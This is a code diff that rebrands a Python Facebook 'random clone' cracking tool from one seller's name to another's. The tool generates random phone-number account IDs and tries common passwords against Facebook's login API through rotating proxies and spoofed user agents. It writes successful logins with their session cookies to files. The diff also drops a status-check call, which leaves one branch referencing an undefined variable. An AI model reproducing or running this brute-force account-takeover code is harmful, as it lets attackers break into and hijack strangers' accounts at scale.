@@ -1,5 +1,3 @@
-#SC MAKE BY HABIB HOSSAIN
-#WORKING SCRIPT SELLER
 #__________________IMPORT____________#
 import os,random
 import sys,time,uuid
@@ -48,7 +46,7 @@ def clear():
         os.system(f'clear')
         print(logo)
 #________________UA______________#
-def sex():
+def CEN():
 	facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
 	fbbv = str(random.randint(10000000, 66666666))
 	fbrv = str(random.randint(000000000,999999999))
@@ -59,16 +57,16 @@ def sex():
 	return ua
 #__________________LOGO____________#
 logo=(f"""
-       {G1}███████ {Y}██     ██  {M}█████   {S}██████
-       {G2}██      {Y}██     ██ {M}██   ██ {S}██
-       {G3}███████ {Y}██  █  ██ {M}███████ {S}██   ███
-       {G4}     ██ {Y}██ ███ ██ {M}██   ██ {S}██    ██
-       {G5}███████  {Y}███ ███  {M}██   ██  {S}██████
+       {G1}███████ {Y}████████ {M}███    ██ {S}█████████
+       {G2}██      {Y}██       {M}██ █   ██ {S}   ██    
+       {G3}██      {Y}████████ {M}██  █  ██ {S}   ██    
+       {G4}██      {Y}██       {M}██   █ ██ {S}   ██    
+       {G5}███████ {Y}████████ {M}██    ███ {S}   ██    
 {A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-{G1}[{A}≈{G1}]{G1} DEVELOPER {A}➢{G1} HABIB\_____ :* \❷/ 3:) \⓿
+{G1}[{A}≈{G1}]{G1} DEVELOPER {A}➢{G1} CENT
 {G1}[{A}≈{G1}]{G1} TOOLTYPE  {A}➢{G1} FILE {A}&{G1} RANDOM CLONE
-{G1}[{A}≈{G1}]{G1} VERSION   {A}➢{A} V{G1}/{A}1.2
-{G1}[{A}≈{G1}]{G1} STATUS    {A}➢{A} SCRIPT SELL
+{G1}[{A}≈{G1}]{G1} VERSION   {A}➢{A} V{G1}/{A}0.1
+{G1}[{A}≈{G1}]{G1} STATUS    {A}➢{A} PRIVATE
 {A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
 #__________________MAIN____________#
 def menu():
@@ -84,7 +82,7 @@ def menu():
     elif sex in ['2']:
         XXX()
     elif sex in ['3']:
-        os.system('xdg-open https://www.facebook.com/sk.sahathat');menu()
+        os.system('xdg-open https://www.facebook.com/CenT.aep');menu()
     elif sex in ['0']:
         sys.exit()
     else:
@@ -150,7 +148,7 @@ def India():
         nmp = "". join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
     clear()
-    with ThreadPool(max_workers=30) as sexy:
+    with ThreadPool(max_workers=30) as CENT:
         clear()
         print(f'{G1}[{A}≈{G1}]{G1} SIM CODE  {A}➢{A} {code}')
         print(f'{G1}[{A}≈{G1}]{G1} TOTAL UID {A}➢{A} {str(len(user))}')
@@ -158,7 +156,7 @@ def India():
         for love in user:
             ids = code + love
             psd = [love,ids[:8],'57273200','59039200','57575751']
-            sexy.submit(randm,ids,psd)
+            CENT.submit(randm,ids,psd)
     print('')
     print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
     print(f'{G1}[{A}≈{G1}]{G1} THE PROCESS HAS BEEN COMPLETED')
@@ -255,11 +253,10 @@ def randm(ids,psd):
             if 'access_token' in q:
                 uid = str(q['uid'])
                 coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
-                res = requests.get(f"https://rajx.pythonanywhere.com/live?uid={uid}").text
                 if res == 'LIVE':
-                	print(f'\r\r{A}[{G1}SWAG-OK{A}]{G1} {uid} {A}|{G1} {pas}');open('/sdcard/SWAG-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n');ok.append(uid);break
+                	print(f'\r\r{A}[{G1}CENT-OK{A}]{G1} {uid} {A}|{G1} {pas}');open('/sdcard/CENT-FILE-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n');ok.append(uid);break
                 if res == 'LOCK':
-                	print(f'\r\r{A}[{S}SWAG-LK{A}]{S} {uid} {A}|{S} {pas}');break
+                	print(f'\r\r{A}[{S}CENT-PODLOCK{A}]{S} {uid} {A}|{S} {pas}');break
             else:continue
         loop+=1
     except Exception as e:
@@ -269,7 +266,7 @@ def M1(ids,names,psd):
     global loop,ok
     nip=random.choice(prox)
     proxs= {'http': 'socks4://'+nip}
-    sys.stdout.write(f'\r\r{A}[{G1}SWAG-XD{A}]-[{G1}{loop}{A}]-[{G1}OK{A}:{G1}{len(ok)}{A}] ')
+    sys.stdout.write(f'\r\r{A}[{G1}CENT-XD{A}]-[{G1}{loop}{A}]-[{G1}OK{A}:{G1}{len(ok)}{A}] ')
     sys.stdout.flush()
     try:
         fn = names.split(' ')[0]
@@ -298,7 +295,7 @@ def M1(ids,names,psd):
             'fb_api_req_friendly_name':'authenticate',
             'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
             'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
-            head={'User-Agent': sex(),
+            head={'User-Agent': CEN(),
             'Accept-Encoding':'gzip, deflate',
             'Connection':'close',
             'Content-Type':'application/x-www-form-urlencoded',
@@ -318,14 +315,14 @@ def M1(ids,names,psd):
             'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
             po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
             if 'access_token' in po:
-                print(f'\r\r{A}[{G1}SWAG-OK{A}]{G1} {ids} {A}|{G1} {pas}')
+                print(f'\r\r{A}[{G1}CEN-OK{A}]{G1} {ids} {A}|{G1} {pas}')
                 coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-                open('/sdcard/SWAG-FILE-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
+                open('/sdcard/CEN-FILE-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                 ok.append(ids)
                 break
             elif 'www.facebook.com' in po['error']['message']:
-                #print(f'\r\r{A}[{M}SWAG-CP{A}]{M} {ids} {A}|{M} {pas}')
-                open('/sdcard/SWAG-FILE-CP.txt','a').write(ids+'|'+pas+'\n')
+                #print(f'\r\r{A}[{M}CEN-PODLOCK{A}]{M} {ids} {A}|{M} {pas}')
+                open('/sdcard/CEN-FILE-PODLOCK.txt','a').write(ids+'|'+pas+'\n')
             else:continue
         loop+=1
     except Exception as e:
